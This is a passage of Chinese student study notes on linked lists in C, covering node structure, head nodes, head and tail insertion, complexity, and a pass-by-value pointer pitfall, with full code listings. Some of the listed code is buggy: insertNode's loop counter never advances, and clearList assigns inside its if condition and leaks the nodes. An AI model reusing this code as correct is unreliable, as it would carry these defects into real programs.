<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(ElemType) * SIZE);<br>    <span class="hljs-keyword">if</span> (!list) <span class="hljs-keyword">return</span> ERROR;<br>    list-&gt;length = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="线性表的链式储存"><a href="#线性表的链式储存" class="headerlink" title="线性表的链式储存"></a>线性表的链式储存</h3><ol><li><p>指针的组成：数据域和指针域（指向下一个）</p></li><li><p>链表的类型</p><ul><li><p>单链表：</p><p>只有一个指针域的链表</p></li><li><p>双链表：</p><p>有两个指针域的链表</p></li><li><p>循环链表：</p><p>首尾相连的链表</p></li></ul></li><li><p>空表的判断：</p><blockquote><p>看一下头指针的是否为NULL,如果为NULL则是空链表</p></blockquote></li><li><p>设置头节点的好处：</p><blockquote><ol><li>便于首元节点的处理</li><li>处理空表和非空表就一样了</li></ol></blockquote><p>![image-20230324170004103](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230324170004103.png)</p></li><li><p>存取元素的方法叫做顺序存取法</p><p>![image-20230324170213582](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230324170213582.png)</p><p>顺序表是随机存取 </p></li><li><p>链表的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//链表</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *linkList;<br><span class="hljs-comment">//使用node表示节点</span><br><span class="hljs-comment">//使用linkList表示链表的</span><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">isEmpty</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">clearList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">listLength</span><span class="hljs-params">(linkList headNode)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getElemSub</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> <span class="hljs-type">char</span> e)</span>;<br><br>status <span class="hljs-title function_">getElemBySub</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> <span class="hljs-type">int</span> sub, ElemType *e)</span>;<br><br>node *<span class="hljs-title function_">getElemPoint</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> <span class="hljs-type">char</span> e)</span>;<br><br>status <span class="hljs-title function_">insertNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub, ElemType e)</span>;<br><br>status <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList charListHead = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> e;<br>    <span class="hljs-type">int</span> sub;<br>    <span class="hljs-comment">//创建头节点</span><br>    charListHead = (linkList) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    charListHead-&gt;next = <span class="hljs-literal">NULL</span>;<br>    charListHead-&gt;date = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    <span class="hljs-comment">//初始化链表</span><br>    initList(charListHead);<br><br>    printfNode(charListHead);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s&quot;</span>, isEmpty(charListHead) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-string">&quot;false&quot;</span>);<br><br>    <span class="hljs-comment">//清空链表</span><br>    clearList(charListHead);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s\n&quot;</span>, isEmpty(charListHead) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-string">&quot;false&quot;</span>);<br><br>    initList(charListHead);<br>    printfNode(charListHead);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, listLength(charListHead));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, getElemSub(charListHead, <span class="hljs-string">&#x27;e&#x27;</span>));<br><br>    getElemBySub(charListHead, <span class="hljs-number">5</span>, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%c&quot;</span>, e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%p&quot;</span>, getElemPoint(charListHead, <span class="hljs-string">&#x27;e&#x27;</span>));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, insertNode(charListHead, <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, getElemSub(charListHead, <span class="hljs-string">&#x27;a&#x27;</span>));<br>    getElemBySub(charListHead, <span class="hljs-number">2</span>, &amp;e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%c&quot;</span>, e);<br><br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d\n&quot;</span>, listLength(charListHead));<br>    printfNode(charListHead);<br><br>    sub = <span class="hljs-number">28</span>;<br>    deleteNode(charListHead, sub);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    printfNode(charListHead);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d&quot;</span>, getElemSub(charListHead, <span class="hljs-string">&#x27;Z&#x27;</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">//删除</span><br>status <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub)</span> &#123;<br>    node *moveNode = headNode;<br>    node* temNode=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;sub&amp;&amp;moveNode-&gt;next!=<span class="hljs-literal">NULL</span>)&#123;<br>        moveNode=moveNode-&gt;next;<br>        i++;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(i&gt;=sub||moveNode==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    temNode=moveNode-&gt;next;<br>    moveNode-&gt;next=moveNode-&gt;next-&gt;next;<br>    <span class="hljs-built_in">free</span>(temNode);<br>    <span class="hljs-keyword">return</span> OK;<br><br>&#125;<br><br><span class="hljs-comment">//插入元素</span><br>status <span class="hljs-title function_">insertNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub, ElemType e)</span> &#123;<br>    node *moveNode = headNode;<br>    node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    temNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    temNode-&gt;date = e;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || sub &gt;= listLength(headNode)) &#123;<br>        <span class="hljs-built_in">free</span>(temNode);<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">int</span> tem = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (tem != sub) &#123;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    temNode-&gt;next = moveNode-&gt;next;<br>    moveNode-&gt;next = temNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br><span class="hljs-comment">//取出元素返回地址</span><br>node *<span class="hljs-title function_">getElemPoint</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> ElemType e)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span> &amp;&amp; moveNode-&gt;date != e) &#123;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> moveNode;<br>&#125;<br><br><br><span class="hljs-comment">//通过下标取出元素</span><br>status <span class="hljs-title function_">getElemBySub</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> <span class="hljs-type">int</span> sub, ElemType *e)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-type">int</span> tem = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (tem != sub) &#123;<br>        moveNode = moveNode-&gt;next;<br>        tem++;<br>    &#125;<br>    *e = moveNode-&gt;date;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//取出元素通过下标</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getElemSub</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> ElemType e)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-type">int</span> sub = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (moveNode &amp;&amp; moveNode-&gt;date != e) &#123;<br>        moveNode = moveNode-&gt;next;<br>        sub++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (moveNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> sub;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//求链表的长度</span><br>status <span class="hljs-title function_">listLength</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        i++;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> i<span class="hljs-number">-1</span>;<br>&#125;<br><br><br><span class="hljs-comment">//清空链表</span><br>status <span class="hljs-title function_">clearList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = <span class="hljs-literal">NULL</span>;<br>    node *deleteNode = <span class="hljs-literal">NULL</span>;<br>    moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next = <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>    &#125;<br>    headNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//判断是否为空</span><br>status <span class="hljs-title function_">isEmpty</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-comment">//打印</span><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;date);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//删除，包括头节点</span><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode;<br>    node *deleteNode;<br>    moveNode = headNode;<br>    <span class="hljs-keyword">while</span> (moveNode) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//初始化</span><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *nextNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        nextNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        nextNode-&gt;date = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        moveNode-&gt;next = nextNode;<br>        moveNode = nextNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>链表操作的时间和空间复杂度</p><ul><li><p>查找  O(n)</p></li><li><p>插入和删除 O(1)</p><p>理由是，插入和删除都是在一瞬间发生的事，不包括前面的查找</p><p>所以在查找的时间复杂度为 O(n);</p></li></ul></li><li><p>链表初始化的方式</p><ul><li><p>头插法</p><p>意思是每次都是从头节点后面一位插入数据</p><p>这个是反循序的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node* temNode=(node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        <span class="hljs-keyword">if</span>(temNode==<span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-keyword">return</span> ERROR;<br>        &#125;<br>        temNode-&gt;date=<span class="hljs-string">&#x27;a&#x27;</span>+i;<br>        temNode-&gt;next=headNode-&gt;next;<br>        headNode-&gt;next=temNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>尾插法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">//初始化</span><br>status <span class="hljs-title function_">initList2</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *nextNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        nextNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        nextNode-&gt;date = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        moveNode-&gt;next = nextNode;<br>        moveNode = nextNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>问题代码</p><ul><li>为什么将头节点放进函数<code>malloc</code>,在main函数中，头节点却是空？</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *linkList;<br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode = <span class="hljs-literal">NULL</span>;<br>    initList(headNode);<br>    printfNode(headNode);<br>    destroyList(headNode);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    headNode = (linkList) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    headNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    headNode-&gt;date = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    node *moveNode = headNode;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;date = <span class="hljs-string">&#x27;a&#x27;</span> + i;<br>        temNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        moveNode-&gt;next = temNode;<br>        moveNode = temNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br><span class="hljs-comment">//打印</span><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;date);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//删除，包括头节点</span><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode;<br>    node *deleteNode;<br>    moveNode = headNode;<br>    <span class="hljs-keyword">while</span> (moveNode) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><p>原因：</p><p>C语言的传参本质上都是传值，也就是拷贝传参，普通变量拷贝的普通的值，指针变量拷贝的是指针</p><p>具体参考：<a href="%5B(21%E6%9D%A1%E6%B6%88%E6%81%AF">深入理解C语言函数传参方式</a> 深入理解C语言函数传参方式_c 为什么是一个一个传参的_amcomputer的博客-CSDN博客](<a href="https://blog.csdn.net/qq_39463175/article/details/115566613">https://blog.csdn.net/qq_39463175/article/details/115566613</a>))</p><p>所以修改后的代码是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 